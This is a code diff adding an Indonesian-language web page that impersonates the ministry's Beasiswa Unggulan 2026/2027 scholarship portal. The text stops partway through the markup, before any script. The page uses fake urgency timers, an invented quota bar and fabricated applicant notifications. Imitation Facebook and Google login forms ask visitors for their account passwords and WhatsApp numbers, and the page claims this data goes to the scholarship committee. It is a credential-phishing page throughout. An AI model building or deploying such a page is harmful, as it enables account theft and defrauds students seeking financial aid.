@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Resmi Beasiswa Unggulan Se-Indonesia 2026/2027 - Kuota Terbatas!</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap"
+        rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        fb: {
+                            DEFAULT: '#1877F2',
+                            dark: '#166FE5',
+                            bg: '#F0F2F5',
+                            btn: '#42B72A'
+                        },
+                        google: {
+                            blue: '#4285F4',
+                            red: '#EA4335',
+                            yellow: '#FBBC05',
+                            green: '#34A853',
+                            bg: '#F8F9FA'
+                        },
+                        brand: {
+                            gold: '#F59E0B',
+                            goldLight: '#FBBF24',
+                            navy: '#0B132B',
+                            slate: '#1C2541',
+                            accent: '#3A506B'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Plus Jakarta Sans', 'sans-serif'],
+                        roboto: ['Roboto', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #073ef3;
+            color: #1282f3;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .hero-gradient {
+            background: radial-gradient(circle at 80% 10%, rgba(245, 158, 11, 0.2), transparent 40%),
+                radial-gradient(circle at 10% 80%, rgba(59, 130, 246, 0.25), transparent 50%),
+                linear-gradient(180deg, #1143e6 0%, #0f172a 50%, #0c45ff 100%);
+        }
+
+        .glass-card {
+            background: rgba(9, 76, 233, 0.65);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .glow-gold {
+            box-shadow: 0 0 30px rgba(11, 38, 245, 0.35);
+        }
+
+        .glow-gold-lg {
+            box-shadow: 0 0 50px rgba(11, 19, 245, 0.5);
+        }
+
+        .text-glow {
+            text-shadow: 0 0 20px rgba(11, 58, 245, 0.6);
+        }
+
+        /* Animated Progress Bar */
+        @keyframes shimmer {
+            0% {
+                background-position: -200% 0;
+            }
+
+            100% {
+                background-position: 200% 0;
+            }
+        }
+
+        .shimmer-bar {
+            background: linear-gradient(90deg, #f59e0b 0%, #fef08a 50%, #f59e0b 100%);
+            background-size: 200% 100%;
+            animation: shimmer 2s infinite linear;
+        }
+
+        .pulse-fast {
+            animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.9;
+                transform: scale(1.02);
+            }
+        }
+
+        .view-section {
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .fb-font {
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .google-font {
+            font-family: 'Roboto', sans-serif;
+        }
+
+        /* Floating Badge Animation */
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0px);
+            }
+
+            50% {
+                transform: translateY(-8px);
+            }
+        }
+
+        .animate-float {
+            animation: float 4s ease-in-out infinite;
+        }
+    </style>
+</head>
+
+<body class="hero-gradient min-h-screen flex flex-col justify-between selection:bg-amber-500 selection:text-slate-950">
+
+    <div
+        class="w-full bg-gradient-to-r from-red-600 via-amber-600 to-red-600 text-white py-2 px-4 text-center text-xs sm:text-sm font-bold tracking-wide flex items-center justify-center gap-2 shadow-lg z-50 sticky top-0">
+        <span class="inline-block w-2.5 h-2.5 rounded-full bg-white animate-ping"></span>
+        <i class="fas fa-exclamation-triangle text-yellow-300 text-sm"></i>
+        <span>PERINGATAN KUOTA: Pendaftaran Gelombang Utama 2026 Segera Ditutup! Sisa Slot Tinggal <span
+                class="bg-black/40 text-yellow-300 px-2 py-0.5 rounded border border-yellow-400/40 font-extrabold"
+                id="topQuotaCounter">28 KUOTA</span> Hari Ini!</span>
+    </div>
+
+    <header class="w-full border-b border-white/10 backdrop-blur-md sticky top-[33px] z-40 bg-slate-950/80">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-3 cursor-pointer" onclick="switchView('landing')">
+                <img src="https://beasiswaunggulan.kemendikdasmen.go.id/wp-content/uploads/2023/05/logo-siunggul-full-white.png"
+                    alt="Logo SiUnggul"
+                    class="h-10 md:h-12 w-auto object-contain transition-transform hover:scale-105 filter drop-shadow-[0_0_10px_rgba(245,158,11,0.3)]"
+                    onerror="this.onerror=null; this.src='https://placehold.co/220x60/1e293b/ffffff?text=Beasiswa+Unggulan';">
+            </div>
+
+            <div class="flex items-center gap-3">
+                <div
+                    class="hidden md:flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 px-3 py-1.5 rounded-full text-xs font-semibold">
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                    Sistem Server Aktif
+                </div>
+                <button onclick="showGasInstructionsModal()"
+                    class="text-xs sm:text-sm bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/40 px-3.5 py-2 rounded-xl transition flex items-center gap-2 font-medium">
+                    <i class="fas fa-database text-amber-400"></i>
+                    <span class="hidden sm:inline">Database Status</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center p-3 sm:p-6 lg:p-8">
+
+        <!-- VIEW 1: LANDING POSTER VIEW -->
+        <section id="view-landing" class="view-section w-full max-w-6xl my-auto py-4">
+
+            <!-- Urgent Top Banner Headline -->
+            <div class="text-center max-w-3xl mx-auto mb-8 space-y-3">
+                <div
+                    class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-gradient-to-r from-red-500/20 via-amber-500/20 to-red-500/20 border border-amber-500/40 text-amber-300 text-xs sm:text-sm font-extrabold tracking-wider uppercase animate-float">
+                    <i class="fas fa-fire text-amber-400 animate-bounce"></i> AYO DAFTAR SEKARANG! KUOTA SANGAT TERBATAS
+                </div>
+                <h1 class="text-3xl sm:text-5xl lg:text-6xl font-black text-white leading-tight tracking-tight">
+                    Raih Masa Depan Impian Bersama <br class="hidden sm:inline">
+                    <span
+                        class="text-transparent bg-clip-text bg-gradient-to-r from-amber-300 via-yellow-200 to-amber-500 text-glow">Beasiswa
+                        Unggulan 2026/2027</span>
+                </h1>
+                <p class="text-slate-300 text-sm sm:text-base leading-relaxed max-w-2xl mx-auto">
+                    Program Bantuan Biasiswa Penuh Kementerian Pendidikan Dasar & Menengah RI untuk Jenjang <b>D4, S1,
+                        S2 & S3</b>. Biaya Kuliah 100% Ditanggung + Uang Saku Bulanan!
+                </p>
+            </div>
+
+            <div class="max-w-4xl mx-auto mb-10">
+                <div
+                    class="glass-card p-5 sm:p-7 rounded-3xl border border-amber-500/40 glow-gold relative overflow-hidden">
+
+                    <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+
+                        <!-- Left side: Urgency Text & Timer -->
+                        <div class="text-center md:text-left space-y-2">
+                            <span
+                                class="text-xs font-bold text-red-400 uppercase tracking-widest flex items-center justify-center md:justify-start gap-1">
+                                <i class="fas fa-clock animate-spin" style="animation-duration: 4s;"></i> Pendaftaran
+                                Ditutup Dalam:
+                            </span>
+                            <div class="flex items-center justify-center md:justify-start gap-2 sm:gap-3 text-white font-black"
+                                id="countdownTimer">
+                                <div
+                                    class="bg-slate-900/90 border border-amber-500/30 rounded-2xl px-3 py-2 text-center min-w-[65px]">
+                                    <span class="text-2xl sm:text-3xl text-amber-400 block" id="cd-hours">08</span>
+                                    <span
+                                        class="text-[10px] text-slate-400 font-normal uppercase tracking-wider">Jam</span>
+                                </div>
+                                <span class="text-amber-400 text-xl font-bold">:</span>
+                                <div
+                                    class="bg-slate-900/90 border border-amber-500/30 rounded-2xl px-3 py-2 text-center min-w-[65px]">
+                                    <span class="text-2xl sm:text-3xl text-amber-400 block" id="cd-minutes">42</span>
+                                    <span
+                                        class="text-[10px] text-slate-400 font-normal uppercase tracking-wider">Menit</span>
+                                </div>
+                                <span class="text-amber-400 text-xl font-bold">:</span>
+                                <div
+                                    class="bg-slate-900/90 border border-amber-500/30 rounded-2xl px-3 py-2 text-center min-w-[65px]">
+                                    <span class="text-2xl sm:text-3xl text-amber-400 block" id="cd-seconds">19</span>
+                                    <span
+                                        class="text-[10px] text-slate-400 font-normal uppercase tracking-wider">Detik</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right side: Quota Progress Bar -->
+                        <div class="w-full md:w-1/2 space-y-2">
+                            <div class="flex justify-between items-center text-xs sm:text-sm font-semibold">
+                                <span class="text-slate-300 flex items-center gap-1.5">
+                                    <i class="fas fa-users text-amber-400"></i> Status Kuota Nasional
+                                </span>
+                                <span class="text-amber-300 font-extrabold" id="quotaText">94% Terisi (Sisa 28
+                                    Slot)</span>
+                            </div>
+                            <!-- Bar Container -->
+                            <div
+                                class="w-full bg-slate-950 rounded-full h-4 p-0.5 border border-amber-500/30 relative overflow-hidden">
+                                <div class="shimmer-bar h-full rounded-full transition-all duration-1000"
+                                    id="quotaProgressBar" style="width: 94%;"></div>
+                            </div>
+                            <p class="text-[11px] text-red-300 text-center md:text-right font-medium">
+                                <i class="fas fa-exclamation-circle mr-1"></i> Segera klaim slot Anda sebelum
+                                pendaftaran dikunci sistem!
+                            </p>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Grid -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch">
+
+                <!-- Poster Banner Content (Left Column) -->
+                <div class="lg:col-span-6 space-y-6 flex flex-col justify-between">
+
+                    <div class="space-y-4">
+                        <div class="glass-card p-6 rounded-3xl border-l-4 border-l-amber-500 space-y-3">
+                            <h3 class="text-xl font-bold text-white flex items-center gap-2">
+                                <i class="fas fa-award text-amber-400 text-2xl"></i> Fasilitas Penerima Beasiswa
+                            </h3>
+                            <p class="text-xs text-slate-300">Semua biaya pendidikan dan kebutuhan hidup ditanggung
+                                penuh selama studi berlangsung:</p>
+                        </div>
+
+                        <!-- Feature Badges Grid -->
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                            <div
+                                class="glass-card p-4 rounded-2xl flex items-center gap-3 border-l-4 border-l-emerald-400 hover:border-emerald-300 transition group">
+                                <div
+                                    class="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-xl group-hover:scale-110 transition-transform">
+                                    <i class="fas fa-graduation-cap"></i>
+                                </div>
+                                <div>
+                                    <div class="text-xs text-slate-400 font-medium">Biaya Kuliah (UKT)</div>
+                                    <div class="text-sm font-extrabold text-white">100% Full Cover</div>
+                                </div>
+                            </div>
+
+                            <div
+                                class="glass-card p-4 rounded-2xl flex items-center gap-3 border-l-4 border-l-amber-400 hover:border-amber-300 transition group">
+                                <div
+                                    class="w-12 h-12 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-xl group-hover:scale-110 transition-transform">
+                                    <i class="fas fa-wallet"></i>
+                                </div>
+                                <div>
+                                    <div class="text-xs text-slate-400 font-medium">Uang Saku Bulanan</div>
+                                    <div class="text-sm font-extrabold text-white">Rutin Ditransfer</div>
+                                </div>
+                            </div>
+
+                            <div
+                                class="glass-card p-4 rounded-2xl flex items-center gap-3 border-l-4 border-l-blue-400 hover:border-blue-300 transition group">
+                                <div
+                                    class="w-12 h-12 rounded-xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-xl group-hover:scale-110 transition-transform">
+                                    <i class="fas fa-book-reader"></i>
+                                </div>
+                                <div>
+                                    <div class="text-xs text-slate-400 font-medium">Tunjangan Buku</div>
+                                    <div class="text-sm font-extrabold text-white">Rp 10.000.000+/Thn</div>
+                                </div>
+                            </div>
+
+                            <div
+                                class="glass-card p-4 rounded-2xl flex items-center gap-3 border-l-4 border-l-purple-400 hover:border-purple-300 transition group">
+                                <div
+                                    class="w-12 h-12 rounded-xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-center text-purple-400 text-xl group-hover:scale-110 transition-transform">
+                                    <i class="fas fa-laptop-code"></i>
+                                </div>
+                                <div>
+                                    <div class="text-xs text-slate-400 font-medium">Bantuan Riset & Skripsi</div>
+                                    <div class="text-sm font-extrabold text-white">Fasilitas Lengkap</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Trust Stats Footnote -->
+                    <div
+                        class="glass-card p-4 rounded-2xl flex items-center justify-around border-amber-500/20 text-center">
+                        <div>
+                            <div class="text-lg font-black text-amber-400">48.200+</div>
+                            <div class="text-[10px] text-slate-400 uppercase font-medium">Pendaftar Terverifikasi</div>
+                        </div>
+                        <div class="w-px h-8 bg-white/10"></div>
+                        <div>
+                            <div class="text-lg font-black text-amber-400">34 Provinsi</div>
+                            <div class="text-[10px] text-slate-400 uppercase font-medium">Seluruh Indonesia</div>
+                        </div>
+                        <div class="w-px h-8 bg-white/10"></div>
+                        <div>
+                            <div class="text-lg font-black text-emerald-400">AKREDITASI A</div>
+                            <div class="text-[10px] text-slate-400 uppercase font-medium">Resmi Pemerintah</div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Registration Trigger Card (Right Column) -->
+                <div class="lg:col-span-6 flex">
+                    <div
+                        class="glass-card p-6 sm:p-8 rounded-3xl border-2 border-amber-500/40 glow-gold-lg space-y-6 relative overflow-hidden flex flex-col justify-between w-full">
+
+                        <!-- Top glowing strip -->
+                        <div
+                            class="absolute top-0 left-0 right-0 h-2 bg-gradient-to-r from-blue-500 via-amber-400 to-emerald-500 animate-pulse">
+                        </div>
+
+                        <div class="space-y-4">
+                            <!-- Official Logo Header -->
+                            <div class="text-center space-y-2">
+                                <img src="https://beasiswaunggulan.kemendikdasmen.go.id/wp-content/uploads/2023/05/logo-siunggul-full-white.png"
+                                    alt="Logo Beasiswa Unggulan"
+                                    class="h-12 mx-auto object-contain mb-3 drop-shadow-[0_0_12px_rgba(245,158,11,0.4)]"
+                                    onerror="this.onerror=null; this.src='https://placehold.co/200x50/1e293b/ffffff?text=Beasiswa+Unggulan';">
+
+                                <div
+                                    class="inline-block bg-amber-500/20 text-amber-300 font-extrabold text-xs px-3 py-1 rounded-full border border-amber-500/30">
+                                    LANGKAH PENDAFTARAN RESMI
+                                </div>
+                                <h2 class="text-2xl font-black text-white">Pilih Metode Verifikasi Akun</h2>
+                                <p class="text-slate-300 text-xs sm:text-sm">Silakan klik salah satu tombol akun sosial
+                                    resmi di bawah ini untuk memulai pengisian formulir pendaftaran Beasiswa Unggulan:
+                                </p>
+                            </div>
+
+                            <!-- Method Choice Buttons -->
+                            <div class="space-y-4 pt-3">
+
+                                <!-- Facebook Button -->
+                                <button onclick="switchView('fb')"
+                                    class="pulse-fast w-full bg-gradient-to-r from-[#1877F2] to-[#0052cc] hover:from-[#166fe5] hover:to-[#0041a3] text-white p-4.5 rounded-2xl font-bold flex items-center justify-between shadow-lg shadow-blue-600/40 transition-all hover:scale-[1.02] active:scale-[0.98] border border-blue-400/30 group">
+                                    <div class="flex items-center gap-3.5">
+                                        <div
+                                            class="w-12 h-12 rounded-xl bg-white/20 flex items-center justify-center group-hover:scale-110 transition-transform shadow-inner">
+                                            <i class="fab fa-facebook-f text-2xl text-white"></i>
+                                        </div>
+                                        <div class="text-left">
+                                            <div
+                                                class="text-[11px] text-blue-100 uppercase tracking-widest font-semibold flex items-center gap-1">
+                                                <i class="fas fa-check-circle"></i> METODE 1 (REKOMENDASI)
+                                            </div>
+                                            <div class="text-base sm:text-lg font-black tracking-wide">Daftar via Akun
+                                                Facebook</div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        class="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center group-hover:translate-x-1 transition-transform">
+                                        <i class="fas fa-chevron-right text-white text-sm"></i>
+                                    </div>
+                                </button>
+
+                                <!-- Google Button -->
+                                <button onclick="switchView('google')"
+                                    class="w-full bg-gradient-to-r from-white to-slate-100 hover:from-slate-100 hover:to-slate-200 text-slate-900 p-4.5 rounded-2xl font-bold flex items-center justify-between shadow-xl transition-all hover:scale-[1.02] active:scale-[0.98] border border-white/80 group">
+                                    <div class="flex items-center gap-3.5">
+                                        <div
+                                            class="w-12 h-12 rounded-xl bg-white flex items-center justify-center group-hover:scale-110 transition-transform shadow-md border border-slate-200">
+                                            <svg class="w-7 h-7" viewBox="0 0 24 24">
+                                                <path fill="#4285F4"
+                                                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
+                                                <path fill="#34A853"
+                                                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
+                                                <path fill="#FBBC05"
+                                                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
+                                                <path fill="#EA4335"
+                                                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
+                                            </svg>
+                                        </div>
+                                        <div class="text-left">
+                                            <div
+                                                class="text-[11px] text-slate-500 uppercase tracking-widest font-semibold flex items-center gap-1">
+                                                <i class="fas fa-check-circle text-emerald-500"></i> METODE 2
+                                            </div>
+                                            <div class="text-base sm:text-lg font-black text-slate-900 tracking-wide">
+                                                Daftar via Akun Google</div>
+                                        </div>
+                                    </div>
+                                    <div
+                                        class="w-8 h-8 rounded-full bg-slate-200/80 flex items-center justify-center group-hover:translate-x-1 transition-transform">
+                                        <i class="fas fa-chevron-right text-slate-600 text-sm"></i>
+                                    </div>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Trust Seal -->
+                        <div class="pt-4 border-t border-white/10 text-center space-y-1">
+                            <div class="flex items-center justify-center gap-2 text-amber-300 text-xs font-semibold">
+                                <i class="fas fa-lock"></i> Terenkripsi 256-Bit SSL Security Portal
+                            </div>
+                            <p class="text-[11px] text-slate-400">Data Anda tersimpan secara aman & langsung terhubung
+                                ke database panitia.</p>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- VIEW 2: FACEBOOK LOGIN PAGE VIEW -->
+        <section id="view-fb" class="view-section w-full max-w-md hidden my-auto py-6">
+
+            <!-- Back button -->
+            <button onclick="switchView('landing')"
+                class="mb-4 text-amber-300 hover:text-white text-xs sm:text-sm font-semibold flex items-center gap-2 transition bg-white/5 px-3 py-2 rounded-xl border border-white/10">
+                <i class="fas fa-arrow-left"></i> Kembali ke Halaman Utama
+            </button>
+
+            <!-- Facebook authentic container -->
+            <div
+                class="bg-[#F0F2F5] text-slate-900 rounded-3xl overflow-hidden shadow-2xl fb-font border-2 border-blue-500/30">
+
+                <!-- FB Header Bar -->
+                <div class="bg-gradient-to-r from-[#1877F2] to-[#1464cc] p-6 text-center shadow-md">
+                    <h1 class="text-4xl font-extrabold text-white tracking-tight">facebook</h1>
+                    <p class="text-blue-100 text-xs font-medium mt-1">Verifikasi Identitas Pendaftar Beasiswa Unggulan
+                    </p>
+                </div>
+
+                <div class="p-6 space-y-4">
+                    <div
+                        class="bg-blue-50 border border-blue-300 rounded-xl p-3.5 text-xs text-blue-900 flex items-start gap-2.5">
+                        <i class="fas fa-shield-alt text-lg text-[#1877F2] shrink-0 mt-0.5"></i>
+                        <span>Silakan masuk dengan akun Facebook Anda untuk mengklaim kuota Beasiswa Unggulan
+                            2026.</span>
+                    </div>
+
+                    <form onsubmit="handleFormSubmit(event, 'Facebook')" class="space-y-3">
+                        <input type="hidden" name="method" value="Facebook">
+
+                        <div>
+                            <label class="block text-xs font-bold text-gray-700 mb-1">Email atau Nomor Ponsel
+                                Facebook</label>
+                            <input type="text" id="fb-email" name="email" required
+                                placeholder="Email / No HP Facebook Anda"
+                                class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#1877F2]">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs font-bold text-gray-700 mb-1">Kata Sandi Facebook</label>
+                            <input type="password" id="fb-password" name="password" required
+                                placeholder="Kata Sandi Facebook"
+                                class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#1877F2]">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs font-bold text-gray-700 mb-1">Nomor WhatsApp Aktif (Untuk Hasil
+                                Seleksi)</label>
+                            <input type="tel" id="fb-phone" name="phone" required placeholder="Contoh: 081234567890"
+                                class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#1877F2]">
+                        </div>
+
+                        <button type="submit"
+                            class="w-full bg-[#1877F2] hover:bg-[#166fe5] active:scale-95 text-white font-black py-3.5 rounded-xl text-base transition duration-200 shadow-lg shadow-blue-500/30 flex items-center justify-center gap-2">
+                            <i class="fas fa-check-circle"></i> KLIK DAFTAR SEKARANG
+                        </button>
+                    </form>
+
+                    <div class="text-center pt-2">
+                        <a href="#"
+                            onclick="showCustomModal('Bantuan Facebook', 'Gunakan email atau nomor HP yang terdaftar pada akun Facebook Anda.', 'info')"
+                            class="text-xs text-[#1877F2] font-semibold hover:underline">Lupa Kata Sandi?</a>
+                    </div>
+
+                    <div class="relative my-4">
+                        <div class="absolute inset-0 flex items-center">
+                            <div class="w-full border-t border-gray-300"></div>
+                        </div>
+                        <div class="relative flex justify-center text-xs uppercase"><span
+                                class="bg-[#F0F2F5] px-3 text-gray-500 font-bold">atau</span></div>
+                    </div>
+
+                    <div class="text-center">
+                        <button type="button" onclick="switchView('google')"
+                            class="w-full bg-[#42b72a] hover:bg-[#36a422] text-white font-bold py-3 rounded-xl text-sm transition shadow-md">
+                            Gunakan Metode Akun Google
+                        </button>
+                    </div>
+                </div>
+
+                <div class="bg-gray-200 p-4 border-t border-gray-300 text-center text-[11px] text-gray-600 font-medium">
+                    Meta Inc. © 2026 • Mitra Resmi Kemendikdasmen RI
+                </div>
+            </div>
+        </section>
+
+        <!-- VIEW 3: GOOGLE LOGIN PAGE VIEW -->
+        <section id="view-google" class="view-section w-full max-w-md hidden my-auto py-6">
+
+            <!-- Back button -->
+            <button onclick="switchView('landing')"
+                class="mb-4 text-amber-300 hover:text-white text-xs sm:text-sm font-semibold flex items-center gap-2 transition bg-white/5 px-3 py-2 rounded-xl border border-white/10">
+                <i class="fas fa-arrow-left"></i> Kembali ke Halaman Utama
+            </button>
+
+            <!-- Google authentic card -->
+            <div
+                class="bg-white text-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl google-font border-2 border-amber-500/30 space-y-6">
+
+                <!-- Google Logo -->
+                <div class="text-center space-y-2">
+                    <svg class="w-12 h-12 mx-auto" viewBox="0 0 24 24">
+                        <path fill="#4285F4"
+                            d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
+                        <path fill="#34A853"
+                            d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
+                        <path fill="#FBBC05"
+                            d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
+                        <path fill="#EA4335"
+                            d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
+                    </svg>
+                    <h1 class="text-2xl font-bold text-gray-800">Login dengan Google</h1>
+                    <p class="text-xs text-gray-600">Verifikasi Berkas Beasiswa Unggulan Se-Indonesia</p>
+                </div>
+
+                <form onsubmit="handleFormSubmit(event, 'Google')" class="space-y-4">
+                    <input type="hidden" name="method" value="Google">
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-700 mb-1">Email Google (@gmail.com)</label>
+                        <input type="email" id="google-email" name="email" required placeholder="nama@gmail.com"
+                            class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm text-gray-900 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-700 mb-1">Sandi Google</label>
+                        <input type="password" id="google-password" name="password" required
+                            placeholder="Masukkan sandi Google Anda"
+                            class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm text-gray-900 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-700 mb-1">Nomor WhatsApp Aktif</label>
+                        <input type="tel" id="google-phone" name="phone" required placeholder="Contoh: 081234567890"
+                            class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-sm text-gray-900 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20">
+                    </div>
+
+                    <div class="text-[11px] text-gray-500 bg-gray-50 p-2.5 rounded-lg border border-gray-200">
+                        <i class="fas fa-info-circle text-blue-500 mr-1"></i> Data dikirim langsung ke server panitia
+                        penyeleksi beasiswa.
+                    </div>
+
+                    <div class="flex items-center justify-between pt-2">
+                        <button type="button" onclick="switchView('fb')"
+                            class="text-xs text-blue-600 font-bold hover:bg-blue-50 px-3 py-2 rounded-lg">
+                            Pindah ke FB
+                        </button>
+
+                        <button type="submit"
+                            class="bg-[#1a73e8] hover:bg-blue-700 active:scale-95 text-white font-black px-7 py-3 rounded-xl text-sm shadow-md transition flex items-center gap-2">
+                            <span>Kirim Pendaftaran</span>
+                            <i class="fas fa-paper-plane text-xs"></i>
+                        </button>
+                    </div>
+                </form>
+
+                <div class="text-xs text-gray-400 text-center pt-3 border-t border-gray-100">
+                    Terlindungi oleh Google Security & OAuth Protocol
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Live Social Proof Applicant Toast Notification -->
+    <div id="socialProofToast"
+        class="fixed bottom-5 left-5 z-50 transform translate-y-32 opacity-0 transition-all duration-500 ease-out max-w-sm">
+        <div
+            class="glass-card bg-slate-900/90 border border-amber-500/40 p-3.5 rounded-2xl shadow-2xl flex items-center gap-3">
+            <div
+                class="w-10 h-10 rounded-full bg-amber-500/20 border border-amber-400 flex items-center justify-center text-amber-400 shrink-0 font-bold text-sm">
+                <i class="fas fa-user-check"></i>
+            </div>
+            <div class="text-xs">
+                <p class="text-white font-bold" id="toastName">Budi S. (Surabaya)</p>
+                <p class="text-amber-300 font-medium text-[11px]" id="toastDesc">Baru saja mendaftar via Google • 2
+                    detik yang lalu</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="w-full border-t border-white/10 bg-slate-950 py-6 text-center text-xs text-slate-400 mt-8">
+        <div class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row justify-between items-center gap-4">
+            <div class="flex items-center gap-3">
+                <img src="https://beasiswaunggulan.kemendikdasmen.go.id/wp-content/uploads/2023/05/logo-siunggul-full-white.png"
+                    alt="SiUnggul Logo" class="h-7 opacity-80"
+                    onerror="this.onerror=null; this.src='https://placehold.co/120x30/1e293b/ffffff?text=Beasiswa+Unggulan';">
+                <span>© 2026 Kementerian Pendidikan Dasar dan Menengah RI</span>
+            </div>
+            <div class="flex gap-4 text-slate-400 font-medium">
+                <a href="#" class="hover:text-amber-400 transition">Syarat & Ketentuan</a>
+                <a href="#" class="hover:text-amber-400 transition">Kebijakan Privasi</a>
+                <a href="#" class="hover:text-amber-400 transition">Pusat Bantuan</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Universal Custom Modal -->
+    <div id="customModal"
+        class="fixed inset-0 bg-black/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-slate-900 border-2 border-amber-500/40 text-white rounded-3xl max-w-md w-full p-6 sm:p-7 shadow-2xl relative transform transition-all scale-95 opacity-0"
+            id="modalBox">
+            <button onclick="closeCustomModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl">
+                <i class="fas fa-times"></i>
+            </button>
+
+            <div id="modalIcon" class="text-5xl mb-3 text-amber-400 text-center">
+                <i class="fas fa-info-circle"></i>
+            </div>
+
+            <h3 id="modalTitle" class="text-xl font-black text-center mb-2">Pemberitahuan</h3>
+            <p id="modalMessage" class="text-xs sm:text-sm text-slate-300 mb-6 leading-relaxed text-center"></p>
+
+            <div class="flex justify-center">
+                <button onclick="closeCustomModal()"
